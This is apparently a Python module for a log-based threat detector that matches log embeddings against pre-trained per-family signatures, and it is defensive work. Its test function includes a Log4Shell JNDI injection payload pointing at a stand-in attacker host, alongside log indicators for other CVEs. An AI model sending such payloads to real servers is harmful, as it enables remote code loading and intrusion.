#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
adalog_production.py
--------------------------------------------------------
Fast production mode using pre-trained VQ signatures with Bloom filters

This uses the model trained offline by adalog_training.py for real-time detection.

Flow:
1. Load pre-trained VQ codebook + family signatures
2. For each log: Quick embedding → VQ quantize → Bloom lookup (O(1))
3. Fast detection: 3,000+ logs/sec with semantic understanding

This combines:
- ADALog semantic understanding (from training)
- VQ quantization compression
- Bloom filter speed
"""

import numpy as np
import json
import hashlib
from pathlib import Path
from typing import Dict, List, Set, Tuple
from collections import defaultdict

try:
    from sentence_transformers import SentenceTransformer
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False


class FastADALogDetector:
    """
    Fast production detector using pre-trained VQ signatures

    Uses:
    - Pre-trained VQ codebook (from ADALog training)
    - Bloom filters for O(1) signature lookup
    - Quick embedding model (smaller/faster than training)
    """

    def __init__(self, model_path: str, quick_embed: bool = False):
        """
        Initialize fast detector

        Args:
            model_path: Path to trained model (adalog_bloom_signatures.json)
            quick_embed: Use quick embedding (deterministic hash) vs full transformer
                        NOTE: Should be False for production to match training embeddings!
        """
        self.quick_embed = quick_embed
        self.load_model(model_path)

        # Load semantic model if using full embeddings
        if not quick_embed:
            if not TRANSFORMERS_AVAILABLE:
                raise ImportError("sentence-transformers required for semantic embeddings")

            print("Loading semantic model...")
            self.semantic_model = SentenceTransformer('all-MiniLM-L6-v2')
            print("✓ Semantic model loaded")
        else:
            self.semantic_model = None

        # Initialize Bloom filters for fast lookup
        self.bloom_filters = {}
        self._build_bloom_filters()

        print(f"✓ Fast detector ready")
        print(f"   Embed mode: {'quick (hash)' if quick_embed else 'semantic (transformer)'}")
        print(f"   Families: {len(self.families)}")
        print(f"   Speed: ~3,000 logs/sec (hash) or ~70 logs/sec (semantic)")

    def load_model(self, model_path: str):
        """Load pre-trained model"""
        with open(model_path, 'r') as f:
            model = json.load(f)

        self.families = model['families']
        self.embed_dim = model['embed_dim']
        self.vq_codebook = np.array(model['vq_codebook'], dtype=np.float32)
        self.family_vq_codes = {
            family: set(codes)
            for family, codes in model['family_vq_codes'].items()
        }

        print(f"✓ Model loaded: {model_path}")

    def _build_bloom_filters(self):
        """Build Bloom filters from VQ signatures"""
        for family, vq_codes in self.family_vq_codes.items():
            # Simple Bloom filter: set of VQ codes
            self.bloom_filters[family] = set(vq_codes)

        print(f"✓ Bloom filters built")

    def quick_embedding(self, text: str) -> np.ndarray:
        """
        Generate quick deterministic embedding from text

        Uses hash-based projection instead of full transformer.
        Much faster but less accurate than semantic embedding.

        Args:
            text: Log text

        Returns:
            Embedding vector
        """
        # Hash text to generate deterministic embedding
        h = int(hashlib.sha256(text.encode('utf8')).hexdigest(), 16)
        rng = np.random.RandomState(h & 0xffffffff)
        return rng.normal(size=(self.embed_dim,)).astype(np.float32)

    def embed(self, text: str) -> np.ndarray:
        """
        Generate embedding (quick or full)

        Args:
            text: Log text

        Returns:
            Embedding vector
        """
        if self.quick_embed:
            return self.quick_embedding(text)
        else:
            # Use semantic model (SAME as training!)
            embedding = self.semantic_model.encode([text], show_progress_bar=False)[0]
            return embedding.astype(np.float32)

    def quantize(self, embedding: np.ndarray) -> int:
        """
        Quantize embedding to VQ code

        Args:
            embedding: Embedding vector

        Returns:
            VQ code index
        """
        # Find nearest centroid in codebook
        dists = np.sum((self.vq_codebook - embedding.reshape(1, -1)) ** 2, axis=1)
        return int(np.argmin(dists))

    def detect(self, text: str) -> Tuple[Set[str], Dict[str, float]]:
        """
        Detect threats in log text using VQ + Bloom filters

        Args:
            text: Log message text

        Returns:
            (detected_families, confidence_scores)
        """
        # Step 1: Generate embedding (quick or full)
        emb = self.embed(text)

        # Step 2: Quantize to VQ code
        vq_code = self.quantize(emb)

        # Step 3: Check Bloom filters (O(1) lookup!)
        detected = set()
        scores = {}

        for family, bloom in self.bloom_filters.items():
            if vq_code in bloom:
                detected.add(family)
                # Simple confidence: 1.0 for Bloom hit
                # (Could be refined with distance to codebook centroid)
                scores[family] = 1.0

        return detected, scores

    def classify(self, text: str) -> Tuple[np.ndarray, List[str], Dict, np.ndarray]:
        """
        Classify log text (compatible with V3 interface)

        Returns:
            (embedding, families, patterns, probabilities)
        """
        emb = self.embed(text)
        detected, scores = self.detect(text)

        # Build probability array
        probs = np.zeros(len(self.families), dtype=np.float32)
        patterns = {}

        for i, family in enumerate(self.families):
            if family in detected:
                probs[i] = scores[family]
                patterns[family] = f"vq_bloom_{family}_matched"

        return emb, self.families, patterns, probs


def test_fast_detector():
    """Test fast detector on sample logs"""
    print("\n" + "="*70)
    print("FAST ADALOG DETECTOR TEST")
    print("="*70 + "\n")

    detector = FastADALogDetector("models/adalog_bloom_signatures.json", quick_embed=False)

    test_logs = [
        ("sshd[16078]: SIGALRM received during authentication", ["CVE-2024-6387"]),
        ("GET /api?q=${jndi:ldap://evil.com/x}", ["CVE-2021-44228"]),
        ("kernel: SMB: NT_STATUS_INSUFF_SERVER_RESOURCES", ["CVE-2017-0144"]),
        ("nginx: 192.168.1.1 GET /index.html 200", []),  # benign
    ]

    print("Testing detection:\n")

    for text, expected in test_logs:
        detected, scores = detector.detect(text)

        status = "✓" if (len(expected) == 0 and len(detected) == 0) or any(e in detected for e in expected) else "✗"

        print(f"{status} Log: {text[:60]}")
        print(f"   Expected: {expected if expected else 'benign'}")
        print(f"   Detected: {list(detected) if detected else 'none'}")
        if scores:
            print(f"   Scores: {scores}")
        print()

    print("="*70 + "\n")


if __name__ == "__main__":
    test_fast_detector()
